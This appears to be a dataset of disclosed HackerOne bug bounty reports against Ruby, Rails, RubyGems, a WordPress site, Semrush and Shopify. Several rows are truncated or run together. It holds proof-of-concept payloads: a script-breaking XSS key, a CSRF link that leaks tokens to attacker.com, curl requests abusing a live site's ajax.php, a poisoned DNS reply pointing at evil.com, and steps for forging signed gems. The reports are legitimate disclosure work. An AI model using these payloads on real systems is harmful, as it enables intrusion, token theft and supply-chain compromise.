[^1]: With one exception: EPSV. The correct behaviour is  first try the EPSV command and if that is not supported,  fall back to using PASV.
Impact
This behavior is by design (unless EPSV ALL is sent) but it could still lead to security issues depending on the context.
I encountered this issue within a web application with a server-side request forgery (SSRF) issue (but this issue applies to any form of SSRF with net/ftp as the request processor). In that context, one can get the following additional capabilities:

Reliable tcp port scanning (this is not normally possible by just providing a random ip:port to net/ftp)
Network service banner extraction (we setup the data channel on the target ip:port and extract for example an ssh banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8 without any errors)
Potential bypass of ip/port restrictions, e.g. the server might be filtering internal IPs or allowing only specific ports (but still allowing FTP)

PoC
I used the following simple code:
Code 162 BytesWrap lines Copy Download1require 'net/ftp'
2ftp = Net::FTP.new
3ftp.connect(ARGV[0], ARGV[1])
4ftp.login
5#ftp.passive = true # by default

7ftp.close

Mitigation
Currently, net/ftp can mitigate this flaw by disabling passive mode, which is enabled by default.  But this is not the best solution to this problem, perhaps, as well as disabling passive mode by default.
For example, firefox just ignores the ip address that is sent from the server. But Curl provides the option which tell to not use the IP address the server suggests in its response to curl's PASV command when curl connects the data connection. Instead curl will re-use the same IP address it already uses for the control connection. The second seems more reasonable.mame Ruby staff  posted a comment. Apr 2nd (2 years ago)Thank you for the report. @shugo, can you please check this ticket?shugo Ruby staff  posted a comment. Apr 5th (2 years ago)Thanks for your report.
I'd like to fix net/ftp to ignore the IP address sent from the server by default, and to add a new option use_pasv_ip to use the IP address sent from the server.  I think it's a rare case that use_pasv_ip is necessary.

Yes, parse228 is confusing.

[Suggested description]
An issue was discovered in Ruby through 2.6.7, 2.7.x through 2.7.3, and 3.x through 3.0.1.
A malicious FTP server can use the PASV response to trick Net::FTP
into connecting back to a given IP address and port. This
potentially makes curl extract information about services that are
otherwise private and not disclosed (e.g., the attacker can conduct port scans
and service banner extractions).

Ruby,501-1000,1.0,No value,"$1,000.00",Low,2.0,Command Injection - Generic,NET::Ftp allows command injection in filenames,"staaldraad  submitted a report to Ruby.Dec 2nd (5 years ago)Hi
While using NET::Ftp I realised you could get command execution through ""malicious"" file names. 
The problem lies in the gettextfile(remotefile, localfile = File.basename(remotefile)) method.
When looking at the source code, you'll note:
Code 275 BytesWrap lines Copy Download1def gettextfile(remotefile, localfile = File.basename(remotefile),
2                &block) # :yield: line
3  f = nil
4  result = nil
5  if localfile
6    f = open(localfile, ""w"") # Vulnerable code here. open(""| os command"",""w"")
7  elsif !block_given?
8    result = String.new
9  end
The localfile value will trigger command execution if the value is | os command. In general use, most users would likely provide their own localfile value and would not rely on the default of File.basename(remotefile); however, in some situations, such as listing and downloading all files in a FTP share, the remotefile value would be controlled by the remote host and could thus be manipulated into causing RCE. Since the file path is simply a string returned by the server (either ls -l style for the LIST command, or filenames for NLIST), there is no need/guarantee that filename will be a valid filename.
I have attached a sample server that can be used to trigger this vulnerability, as well as a sample client which is vulnerable.
Usage:
Change the host and port values in both ftpserver.rb and client.rb
Start the server: ruby ftpserver.rb
Run the client: ruby client.rb
Observe that a new file has been created in the CWD of the client.rb. The file will be called pang and contain the output of the id command. As seen in screenshot1.png
The provided attack example is a little contrived and assumes the user is accepting the file names provided by the server, rather than their own. However, since there is no clear indication in the documentation or an expectation that filenames could lead to RCE, users may be caught unaware. It would probably be best to not use open in NET::Ftp, but rather something like File.open, maintaining both expected behaviour and security.
Impact
Remote code execution through command injection. As a user of the NET::Ftp is expecting normal file creation behaviour, they might not be sanitising file paths.3 attachments:F243804: screenshot1.pngF243806: client.rbF243807: ftpserv.rb",https://hackerone.com/reports/294462,No value,No value,No value,2017,12,2,11,33

When the first argument is one character longer than the second, or the second argument contains a character that is one less than a character in the same position of the first argument, the result of == will be true. Example below:

Impact
Whenever names are compared during certificate validation an attacker could use a certificate with a different name, but the comparison will return that they are equal. This would allow an attacker to create an illegitimate certificate that may be accepted as legitimate and then used in signing or encryption operations.",https://hackerone.com/reports/387250,No value,No value,No value,2018,7,26,17,24

Impact
Attackers can cause an application to be unreachable, causing a denial of service condition.
Details
When a Rails application receives a request with either body or query parameters, these parameters are converted to a params hash. Hashes can be passed to the application in the form of user[name]=foo&user[address]=bar. Action Pack will then convert this into a hash in the form of { user[:name] => ""foo"", user[:address] => ""bar"" }. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.
This was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.
Production Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.
Bug Notes
It seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It's possible that a loop is being hit here every time the SystemStackError occurs.
I set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set 'catch SystemStackError'. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.
Reproduction Steps
For Webrick:

rails new dos_test
cd dos_test
bundle exec rails generate controller welcome index
Uncomment the root 'welcome#index' line in config/routes.rb
SECRET_KEY_BASE='foo' bundle exec rails s -e production
Then in a separate window, run the following cURL command:

Ruby on Rails,11-50,1.0,1m-10m,"$1,500.00",No value,0.0,Information Disclosure,Directory traversal attack in view resolver,"lautis  submitted a report to Ruby on Rails.Mar 6th (9 years ago)There seems to be two cases that allow directory traversal when using wildcard URL segments that allow rendering view outside view paths.
For example, let say there is a route
	get '/help/(*action)’, controller: ‘help’
and a matching controller
	class HelpController < ApplicationController
end
This renders all views that are in 'app/views/help’ (assuming default view paths) even when matching action method is not defined.
If an attacker made a request GET /help/../../../Gemfile, ActionView::FileSystemResolver returns Gemfile from project root as the matching view. This simple case can be prevented using Rack::Protection::PathTraversal middleware, but it is not enabled by default in Rails. Also, there could be other mechanisms that may result in rendering views that are outside view path. Not sure if that’s the expected behaviour, but this surprised me.
However, Rack::Protection::PathTraversal can be bypassed using backslashes: GET /help/%5c../%5c../%5c../Gemfile. The resolver uses Dir.glob, which escapes backslashes unless File::FNM_NOESCAPE flag is used. Rack::Protection::PathTraversal won’t intercept '\../' and the resolver treats '\../' as '../'.
Attached are fixes for the mentioned vulnerabilities with test cases.2 attachments:F4047: 0001-Do-not-escape-backslashes-in-view-paths.patchF4048: 0002-Ensure-that-templates-are-within-view-paths.patch",https://hackerone.com/reports/3370,West Bengal,India,Kolkata,2014,3,6,11,13

Code 68 BytesWrap lines Copy Download1irb(main):001:0> {""a""=>""<>""}.to_json

However keys are not:
Code 56 BytesWrap lines Copy Download1irb(main):002:0> {""<>""=>""a""}.to_json
2=> ""{\""<>\"":\""a\""}""
This is because the json gem calls .to_s on the keys here which transforms the EscapedString back into a simple String so it doesn't go through the escaping process that values go through here.
Security consideration: this issue is a vector for XSS when an arbitrary value is used as a key and reflected in a javascript tag. Consider this piece of code:
Code 43 BytesWrap lines Copy Download1javascript_tag ""var json=#{params.to_json}""
When params is something like {""</script><script>alert(1)//""=>""xss""} then <> are not escaped as they should and the javascript tag looks like this:

2//<![CDATA[
3var json={""</script><script>alert(1)//"":""xss""}

5</script>
The </script> inside the json object will terminate the opening script tag because it has precedence over everything else, and alert(1) is executed.
I believe this issue also applies to 4.2-stable and master.
Note that I opened a PR for a related issue in the json gem (https://github.com/flori/json/pull/235) which occurs when ActiveSupport.escape_html_entities_in_json = false because the forward slash is never escaped (neither in rails nor in the json gem).

As the Web Console documentation states:
Web Console is built explicitly for Rails 4.
By default the Web Console is available in the Rails Development Environment and allows only the IPs 127.0.0.1 and ::1 to access the console in order to evaluate arbitrary Ruby statements for the purpose of debugging.
However with Rails Versions 4.1 and 4.0 the Web Console built in IP whitelist is bypassable.
This is due to the fact that Web Console parses the request.remote_ip to check if the IP is whitelisted with the Ruby class IPAddr. The Rails stack prior to 4.2 when calculating request.remote_ip uses these regular expressions to strip out trusted Proxies from the HTTP Headers X-Forwarded-For and Client-IP.
Due to this parser differential an attacker might bypass the Web Console IP whitelist by supplying a HTTP header value of:
X-Forwarded-For: 0000::1 
This IPv6 address in the given notation would bypass the TRUSTED_PROXIES entry ^::1$ but match the IPAddr value of ::1 within Web Console.
As the Web Console is intended for debugging in the Development Environment this will most likely not affect Production setups, unless Web Console is explicitly enabled. But gaining RCE on Developer laptops might be fun as well ;).
I've already sent a description of this to the Rails Security Team via mail, but I've been asked to submit here again. 
The easiest mitigation of this issue would be to disallow execution of Web Console within Rails < 4.2.",https://hackerone.com/reports/44513,West Bengal,India,Kolkata,2015,1,21,12,51
Ruby on Rails,11-50,1.0,1m-10m,"$1,000.00",No value,0.0,Cross-Site Request Forgery (CSRF),rails-ujs will send CSRF tokens to other origins,"mastahyeti  submitted a report to Ruby on Rails.Mar 3rd (8 years ago)I reported this via email a few months ago. Here was my initial email:

Hello,
I've been playing with getting Rails apps to send CSRF tokens to the wrong domains and I found a few problems. The main motivation for this is in attacking a site that uses Content Security Policy. With CSP enabled, an attacker with an XSS vulnerability cannot simply inject inline JavaScript, but they can still abuse some Rails features to steal a CSRF token.
In the scenario where an attacker can inject arbitrary HTML into the response, the simplest attack would be to inject:
<a href=""https://attacker.com"" data-remote data-method=""post"" data-cross-domain=""false"">
Clicking on this link will trigger an OPTIONS request to attacker.com. If the attacker returns the correct CORS headers, a POST request containing the user's CSRF token will be sent to attacker.com.
In a second scenario, an attacker might be able to control only the href attribute of an anchor tag or the action attribute of a form tag that will trigger a data-remote action. This isn't uncommon to see if the site is building anchor or form tags dynamically. In this case, the attacker can set the href or action to "" https://attacker.com"". This will be passed to JQuery, who will see this as a same origin request.
The JQuery behavior can be found here and a similar bug in Zepto can be found here. In both these cases, weak regexes don't match the URL and the framework fails open into assuming that the URL is same origin. Prefixing the URL with a space character is one way to break this regex, but the regexes are pretty weak and there are probably other ways as well.
I'll contact the JQuery/Zepto folks about fixing their regexes, but there are a few thing that could improve this in jquery_ujs as well.
I don't think a data attribute (data-cross-domain) should be able to force jquery_ujs to send the CSRF token.
The href attribute should be accessed directly here rather than calling attr(""href""). When called directly, the browser does a lot to clean up the URL and make sure that it is well formed. This would address the space prefix issue.
Some stronger protections could be added before calling CSRFProtection here.
For links with data-method, but without data-remote, the origin isn't even checked before adding a CSRF token to the form. This could even be exploited accidentally. Origin checking should be added here
I haven't seen a bulletproof way for comparing origins yet, but I've got a few ideas if you want to discuss it more. Let me know what you think.
Thanks,
Ben Toews

This allows attackers to inject escape sequences to a victim's terminal emulator.
How to attack
1) An attacker creates a gem with summary string that includes malicious escape sequences, and push it to rubygems.org.
2) A victim executes gem search attackers-gem -d, and the malicious string is printed in the terminal emulator.
In general, this is considered vulnerable.  I'd like you to read Terminal Emulator Security Issues in detail.  In short, an attacker can exploit this, not only to surprise a victim with a rainbow string, but also to inject malicious command to a victim's terminal, which may lead to abitrary code execution.  Ruby WEBrick also handled a similar issue as a vulnerability.

RubyGems,1-10,1.0,No value,"$1,000.00",High,7.95,Path Traversal,Installing a crafted gem package may create or overwrite files,"mame  submitted a report to RubyGems.Jun 26th (5 years ago)There is no check for name field in metadata.gz.  By assigning a maliciously crafted string like ../../../../../any/where to the field, an attacker can create an arbitrary file out of the directory of the gem, or even replace an existing file with a malicious file.
Proof of Concept 1: Create a file anywhere
This PoC attempts to create a file /tmp/malicious-0/BOOOOM.
1) Download the attached file malicious.gem.
2) Run gem install malicious.gem --no-doc.
3) /tmp/malicious-0/BOOOOM should be created.
malicious.gem assigns ../../../../../../../../../../tmp/malicious as name field.  This attack is relatively weak since the path must include a directory named <name>-<version>, such as malicious-0.  Still, there are many chances that cause a catastrophe.  For example, think of replacing a file in /etc/dbus-1/.
Proof of Concept 2: Replace rackup command
This PoC attempts to replace gems/rack-2.0.3/bin/rackup with a malicious file.
1) Download the attached file replace-rackup.gem.
2) Run gem install rack -v 2.0.3.
3) Run gem install replace-rackup.gem --no-doc.
4) Run rackup.  It will emit just BOOOOM!.
replace-rackup.gem assigns ../gems/rack as name field, and contains a malicious file bin/rackup.  This is really exploitable for attackers.
Note
For how to create the malicious gems, see the attached file src.tar.gz.
In my opinion, this attack is much more dangerous than the issues I reported recently.  I hope you could fix this issue ASAP.3 attachments:F197576: src.tar.gzF197577: create-file.gemF197578: replace-rackup.gem",https://hackerone.com/reports/243156,No value,No value,No value,2017,6,26,9,14

The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use Psych.safe_load set from config/initializers/forbidden_yaml.rb.
However, YAML.load is called directly when parsing the gem's checksum file in Gem::Package#read_checksums. Using classes accessible within the application, I was able to turn this into a call to Marshal.load on attacker-controlled data. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away).

The RubyGems client supports a gem server API discovery functionality,
which is used when pushing or pulling gems to a gem distribution/hosting
server, like RubyGems.org.  This functionality is provided via a SRV DNS
request to the users gem source hostname prepended with ""_rubygems._tcp."".
The response to this request tells the RubyGems client (aka: the gem
command) where the users gem server API is.  In the default RubyGems
scenario, with a gem source of https://rubygems.org, the users SRV DNS
request and reply will look like this:
    ~ $ dig srv _rubygems._tcp.rubygems.org +short
0 1 80 api.rubygems.org.
Due to a deficiency in DNS response verification, a MiTM positioned
attacker can poison the DNS response to this record response and force
the client to unknowingly download and install Ruby gems from an attacker
controlled gem server in an alternate security domain.  An example of
such a scenario would look like so:
    ~ $ dig _rubygems._tcp.rubygems.org SRV +short
0 0 53 evil.com/api.rubygems.com.
In such a scenario, the attacker is able to serve the client malicious gem
content, resulting in trivial remote code execution scenarios.  For
example, the attacker could simply modify the gem source code and trigger
code execution via the extensions API at install time on the client machine

Consider this small patch to address the immediate attack vector...

     if /.#{Regexp.quote(host)}\z/ =~ target


     if (/.#{Regexp.quote(host)}\z/ =~ target) && !target.include?(""/"")

Also, consider moving away from doing API discovery via DNS.  Would recommend
moving to HTTPS, where you will have a stronger transport security chain.

Inconsistencies in how gem processes gem files make it possible to reuse a signature from an existing signed gem and apply it to arbitrary contents. The forged gem will install even with -P HighSecurity.
The attached file multi_json-1.12.2.gem is a forged version of the genuine multi_json-1.12.2.gem gem with faked contents (just a single text file called HACKED). Here is how to check it. You must first trust the original developer's public key.

Details
The vulnerability stems from inconsistencies in how gem interprets the entries of the tar container. A tar file may contain multiple entries with the same name. When there are two data.tar.gz entries, for example, gem will honor the second one when verifying the signature, but the first one when installing files. The proof of concept gem uses this trick: it prepends an additional data.tar.gz entry to the genuine multi_json-1.12.2.gem. (The attached forge-gem.sh script was used to make it.)
Code 475 BytesWrap lines Copy Download1$ tar tvf multi_json-1.12.2.gem

8-r--r--r-- wheel/wheel     256 2017-09-04 21:51 checksums.yaml.gz.sig
A similar bug affects checksums.yaml.gz: checksums are read from the first such entry, while the signature is verified on the last. This table summarizes the inconsistencies:
fileextract_files usesverify usesdata.tar.gzfirstlastchecksums.yaml.gzfirstlastmetadata.gzlastlast
Source code references
Here are the pieces of code that are responsible for the inconsistencies in processing.
extract_files takes the first data.tar.gz entry:
Code 394 BytesWrap lines Copy Download1  def extract_files destination_dir, pattern = ""*""
2    verify unless @spec
3
4    FileUtils.mkdir_p destination_dir
5
6    @gem.with_read_io do |io|
7      reader = Gem::Package::TarReader.new io
8
9      reader.each do |entry|
10        next unless entry.full_name == 'data.tar.gz'
11
12        extract_tar_gz entry, destination_dir, pattern
13
14        return # ignore further entries
15      end
16    end
17  end
read_checksums seeks to the first checksums.yaml.gz entry:
Code 198 BytesWrap lines Copy Download1  def read_checksums gem
2    Gem.load_yaml
3
4    @checksums = gem.seek 'checksums.yaml.gz' do |entry|
5      Zlib::GzipReader.wrap entry do |gz_io|
6        YAML.load gz_io.read
7      end
8    end
9  end
verify_files and verify_entry iterate over all entries in the tar file, filling in @signatures and @digests. In the case of entries with duplicate names, it overwrites previous values, meaning that the last result wins. verify_entry also handles metadata.gz, calling load_spec afresh each time:
Code 542 BytesWrap lines Copy Download1  def verify_entry entry
2    file_name = entry.full_name
3    @files << file_name
4
5    case file_name
6    when /\.sig$/ then
7      @signatures[$`] = entry.read if @security_policy
8      return
9    else
10      digest entry
11    end
12
13    case file_name
14    when /^metadata(.gz)?$/ then
15      load_spec entry
16    when 'data.tar.gz' then
17      verify_gz entry
18    end
19  rescue => e
20    message = ""package is corrupt, exception while verifying: "" +
21              ""#{e.message} (#{e.class})""
22    raise Gem::Package::FormatError.new message, @gem
23  end
verify_checksums and verify_signatures operate only on the precomputed @checksums, @signatures, and @digests.
Incidentally, get_metadata, used by the unpack command, has its own extractor for metadata.gz, but it happens to grab the last entry, just like verify_files.
Mitigation
The attached patch 0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patch adds two new tests (both currently failing) that check signature verification when bogus files come before or after the genuine files.
The essential mitigation is to ensure that there is no ambiguity when processing a tar file that has multiple entries for the same file name. E.g., ""data.tar.gz"" must refer to one and only one entry in the tar file. One way to do it would be to set a policy in the code: e.g., last entry always wins (which would be consistent with the tar command). But that would be hard to enforce, especially in new code going forward. Another way would be not to permit duplicate entries; e.g., verify_entry could check whenever it is about to overwrite something in @signatures, @digests, or @spec, and return an error. This needs some care, as metadata and metadata.gz are both processed equivalently. It is possible, using symlinks, to create entries that effectively point to the same file, even though the paths differ; e.g.:
Code 38 BytesWrap lines Copy Download1data.tar.gz
2dir/ -> ..
3dir/data.tar.gz
But this shouldn't be a problem for gem, as long as it continues to use strict string equality with unadorned paths like ""data.tar.gz"".
Even when this bug is fixed, a weaker form of signature forgery is possible. There is nothing in a gem file that binds data.tar.gz and metadata.gz together: they are signed independently. It is possible to mix and match files from different signed gems. Suppose a signed gem example-1.0 has a security vulnerability, and the authors release a new signed update example-1.1. Someone (perhaps a malicious rubygems.org admin) could forge a gem containing data.tar.gz from example-1.0 and metadata.gz from example-1.1. Users would think they are running the updated code, but they are still running the old vulnerable code. Fixing this weaker form of forgery seems like it would require a redesign of the signature format. Ideally, the signature would be over the entire gem, and verified before any unpacking.
It seems that not many people are sign their gems or verify signatures. For most users the possibility of signature forgery doesn't put them at additional risk beyond the (already risky) status quo. The flaw affects only those users who use the MediumSecurity or HighSecurity profiles.

multi_json-1.12.2.gem is a gem with a forged signature.
0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patch adds tests for specific instances of gem files that contain multiple entries with the same name.
forge-gem.sh takes an existing signed gem and produces a forged gem containing an arbitrary data.tar.gz file.

How to run forge-gem.sh:
Code 187 BytesWrap lines Copy Download1$ gem fetch multi_json
2$ mkdir orig
3$ mv multi_json-1.12.2.gem orig/
4$ echo hacked > HACKED
5$ tar czf data.tar.gz HACKED
6$ ./forge-gem.sh orig/multi_json-1.12.2.gem data.tar.gz forged.gem
Be aware that if the original multi_json-1.12.2.gem and the new forged.gem are both in the same directory, then gem install ./forged.gem will—for some reason—install multi_json-1.12.2.gem instead. You have to hide the original file in another directory first.3 attachments:F227013: multi_json-1.12.2.gemF227014: 0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patchF227015: forge-gem.sh",https://hackerone.com/reports/275269,No value,No value,No value,2017,10,6,23,57

Unauthenticated user can run arbitrary post queries and insert arbitrary numeric post meta via vulnerable /wp-content/themes/SecNews-NewCustom/functions/ajax.php file.
I'm including two exploits in one report because the fix for both is the same, i.e. delete ajax.php.
Run arbitrary post queries
Consider this request:
Code 172 BytesWrap lines Copy Download1curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
2--data 'action=sort&loop=main loop&currentquery[key1]=value1&currentquery[key2]=value2'
It executes a WP_Query against the database with array('key1' => 'value1', 'key2' => 'value2') as the argument.
Attacker can exploit this, for example, to see posts that are scheduled to be published in the future, i.e. posts that are not public yet:
Code 153 BytesWrap lines Copy Download1curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
2--data 'action=sort&loop=main loop&currentquery[post_status]=future'
For example ""Δείτε τα πιο Geeky Raspberry Pi Smartwatches!"" by Bl4ckPr0xyon will be published on 15.08.2016 at 13:21, i.e. in 8 days from today.
Insert arbitrary numeric post meta
Consider this request:
Code 135 BytesWrap lines Copy Download1curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
2--data 'id=100000&action=rate&meta=test&rating=42'
The request parameters get passed to add_post_meta() function, which inserts a row to the post's meta with an arbitrary key and arbitrary value. The value can only be a number though.
Code 237 BytesWrap lines Copy Download1mysql> select * from wp_postmeta where meta_key = ""test"";
2+---------+----------+------------+
3| post_id | meta_key | meta_value |
4+---------+----------+------------+
5|  100000 | test     | 42         |
6+---------+----------+------------+
This can be used by attacker to alter behavior of plugins and themes. For example:

I removed background image from https://www.secnews.gr/100000 by setting _bg_color_override to 1 in the post meta.
I set shares count to -56994 at https://www.secnews.gr/100000 by changing mashsb_shares and mashsb_timestamp meta of the post.

Potentially this can be used to:

Change booleans, counters and timestamps in other plugins leading to information disclosure or website defacement.
Unnoticeably fill the database with garbage data until the disk space is full.

Affected posts
While looking for vulnerabilities I changed some meta for posts 95513, 100000 and 104030. You can clean it up with something like this:
DELETE * FROM wp_postmeta WHERE post_id IN (95513, 100000, 104030) AND meta_key IN ('_bg_color_override', 'mashsb_shares', 'mashsb_timestamp');",https://hackerone.com/reports/157412,No value,No value,No value,2016,8,7,12,53

Semrush,501-1000,0.0,10m-50m,$500.00,Medium,5.45,Path Traversal,Ad Builder Display Ads Path Traversal,"ajxchapman  submitted a report to Semrush.Feb 16th (5 years ago)Summary:
The Semrush Ad Builder for Display Ads is vulnerable to path traversal when extracting zip files and referencing images from the embedded data.csv file.
Description:
The Semrush Ad Builder for Display Ads allows users to import Display Ads from an uploaded zip file. The backend functionality that extracts the uploaded zip file and processes the files contained within is vulnerable to path traversal in multiple places.
Firstly, the zip extractor is vulnerable to path traversal from zip file names, allowing files to be extracted outside of the intended destination directory. Uploaded zip files are extracted to the /█████████/██████████/ab_<api key>_<project id>_displayAds.tmp.unpack destination directory (where <api key> and <project id> are the user's api key and the current project id respectively). If a zip file is extracted which includes a filename with a path traversal specifier (e.g. /../), it will be extracted outside of the intended destination directory.
Example zip file contents and extraction locations:
Code 234 BytesWrap lines Copy Download1Zip file path    Extracted file path
2data.csv      => /██████/█████/ab_███████_1246354_displayAds.tmp.unpack/data.csv
3words.csv     => /████████/████/ab_███_1246354_displayAds.tmp.unpack/words.csv
4../1.png      => /█████████/███/1.png
The full file path of the zip file destination was identified from error messages observed during testing, e.g.:
Code 177 BytesWrap lines Copy Download1{""jsonrpc"":""2.0"",""id"":""1c46d1ff-7327-4be2-8b8f-69c1906fb71c"",""error"":{""code"":-32603,""message"":""mkdir /███████/█████/ab_███_1246354_displayAds.tmp.unpack/link: not a directory""}}
Secondly, the Display Ads file processor is vulnerable to path traversal when processing data.csv files. The Image, Square image, Logo and Landscape logo fields of the data.csv file are all vulnerable to path traversal. Including an Image path with path traversal specifiers allows us to reference images which already exist on the Ad Builder system. For example the path ../../../usr/share/pixmaps/debian-logo.png will reference the /usr/share/pixmaps/debian-logo.png image which exists by default on most Debian based systems. This image will be used in the produced advert.
Please note that during testing I have created two files outside of the /████████/█████/ab_█████_1246354_displayAds.tmp.unpack/ folder, /██████/████████/1.png and /█████/███/link. These files should be removed when this issue is confirmed.

Uploading this zip file, which contains no images, to the Display Ads Ad Builder will create an advert which references an image that already exists on the system outside the intended destination directory. The referenced image is /usr/share/pixmaps/debian-logo.png which exists by default on most Debian based systems. From this we can infer that the Ad Builder is running some Debian derivative Linux.

Impact
These issues can be abused to place arbitrary files in writable directories on the Ad Buider system and infer the existence of █████ious system properties and installed packages (such as Linux flavour, python version, golang version, etc.). 
In the worst case this issue could lead to complete compromise of the Ad Builder system through writing scripts or executables to directories where they will be automatically executed. During testing however, I have been unable to identify any writable directories outside of /███/████████ and it's subdirectories. For this reason I have not included the full system compromise in consideration of the CVSSv3 calculation. However, other writable directories may exist on the system which could increase the impact of this issue significantly.1 attachment:F263911: semrush_displayads.gif",https://hackerone.com/reports/316713,Massachusetts,United States,Boston,2018,2,16,8,24

Description
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

IP used:
78.194.169.36
Endpoint URL:
https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=CALENDAR_ID
EXPLOITATION
Description of Security Issue:
When a marketing calendar is loaded in the browser, the site sends a request such as this: Image F718449: Capture.PNG 85.80 KiBZoom in Zoom out Copy Download.
This request returns information such as if the owner has connected a google analytic account and the owner's user id associated with the calendar with the id pass in parameter. The problem comes from the fact that it is not verified that the user making the request has the calendar or that the person is invited to consult it.
RESOLUTION
Check that the user making the request has the calendar or that the person is invited to consult the calendar.
Impact
Exploit scenario for this vulnerability:


A user such as a concurrent service could by bruteforcing the ""calendar_id"" parameter establish a list of all calendars and the number of unique users who have created calendars. It will also know the number of users who have connected their google analytic account on it. This represents bussiness data.


A user who knows someone's user_id (because he was invited to a calendar owned by the victim for example) can by bruteforcing the parameter ""calendar_id"" establish the number of calendar owned by the victim and the number of calendar being linked to a google analytic account.

Description of Security Issue:
When a user clicks on the ""Enroll for free"" button in the course pages such as here https://www.semrush.com/academy/library/courses?spec=ALL&lang=en-US, the client makes a request like this: Image F696872: Capture.PNG 149.36 KiBZoom in Zoom out Copy Download.
This page registers the user to the course and returns information concerning the user and the course.
The problem lies in the fact that the server does not verify the userId belongs to the user making the request, so an attacker can pretend to be someone else by modifying the userId with that of the victim.
Steps needed to reproduce bug:
1.Login to your account
2.Go to https://www.semrush.com/academy/library/courses?spec=ALL&lang=en-US

RESOLUTION
Check that the userId belongs to the person who registers to the course.
Impact
Number of people concerned:
The bug affects all semrush academy users.
Exploit scenario for this vulnerability:
An attacker can scrap semrush academy in order to have all the existing courseId or choose a particular course and recover his courseId.
Thereafter either the attacker already knows the victim's userId or he can bruteforce the userId field.
The attacker can then register a user for any course he wishes.
The attacker can also deduce according to the value of ""creationDate"" if the user has registered for the course or not and when.
The attacker also has access to other variables such as ""engagement"", ""status"", ""userEngagement"", etc...1 attachment:F696872: Capture.PNG",https://hackerone.com/reports/783708,Massachusetts,United States,Boston,2020,1,26,18,35

Thanks again for your report! We’re awarding a bounty of $22,500 for this report, as it would have allowed an attacker to merge their development store with a targeted user’s Shopify ID. In order for this to work, the targeted account must not have previously undergone an account merge and must not have had two-factor authenticated enabled.

Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF), [CSRF] Activate PayPal Express Checkout,"zombiehelp54  submitted a report to Shopify.Nov 12th (7 years ago)Hi , i have found a CSRF issue when activating PayPal Express checkout.
#Steps to reproduce: 

Create a new store then login with the admin account.
Go to https://<your_store>.myshopify.com/admin/settings/payments and you'll see that PayPal Express checkout is already active , so click the edit button and deactivate it.
Go to the following link: https://<your_store>.myshopify.com/admin/payments/complete_paypal_oauth/41 and you'll see that PayPal Express checkout was activated and you'll get a message saying: Successfully activated your account.

I have been trying to link a malicious paypal email through this CSRF by using the following link:
https://<your_store>.myshopify.com/admin/payments/complete_paypal_oauth/41?verification_token=<PAYPAL_TOKEN> but it doesn't work.
This issue is a little bit confusing when being reproduced since it will only work on a store in which the admin never tried to activate PayPal before because if he did so , a request token will be generated and will be validated for whenever the link is visited.
Please tell me if you are having an issue reproducing it and I will send you a PoC video.

Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Improper Authentication - Generic,"""Remember me"" token generated when ""Remember me"" box unchecked","dhaval  submitted a report to Shopify.Dec 18th (7 years ago)Hi,
This is a weird behaviour which regenerates _secure_admin_session_id cookie
Steps to Reproduce :

Navigate to https://www.shopify.com/login
Enter credentials
Enter two factor code from authenticator

Check cookie, There should be cookie named user_auth_token. I believe this token is auto-generated because simply logging into the account creates it
Now we would leverage https://dr4cun0-2.myshopify.com/admin/users.json for re-generating the _secure_admin_session_id and validating the bug
This is a sample request :

This should be different that the one in the browser
Issue :

Now logout in the browser

Try Request :

So keeping the same auto-generated user_auth_token and new _secure_admin_session_id
we can access the previous session in the browser as well
Issue :

Auto generated token not being expired after logout
Leveraging users.json to re-generate token which does not expire at logout as well

Technically
Once obtain a user_auth_token and get full access to the users account. Also you get the unlimited access because logout from victim side does not affect the new session nor the user_auth_token",https://hackerone.com/reports/105991,Ontario,Canada,Ottawa,2015,12,18,21,25
Shopify,5001-10000,0.0,200m-1b,"$1,500.00",No value,0.0,Code Injection,'Limited' RCE in certain places where Liquid is accepted,"brakhane  submitted a report to Shopify.Nov 6th (7 years ago)Short
Certain interfaces where a shop owner/administrator is able to utilize Liquid have access to methods and properties of certain Drops. This allows calling all methods of the object and access to all properties. While this sounds bad, it seems to be very limited and seems to be 'only' usable for Information Disclosure.
PoC


Go to your shop admin and navigate to the Notifcation settings


Edit the New Order Template and place the following text into the textbox (also shown in the Malicious Template screenshot:
{{ methods | json }}
{{ systemu }}
{{ class }}
{{ to_yaml}}


Click the Preview Button to have your code executed, results are shown in the Malicious Template Rendered screenshot.


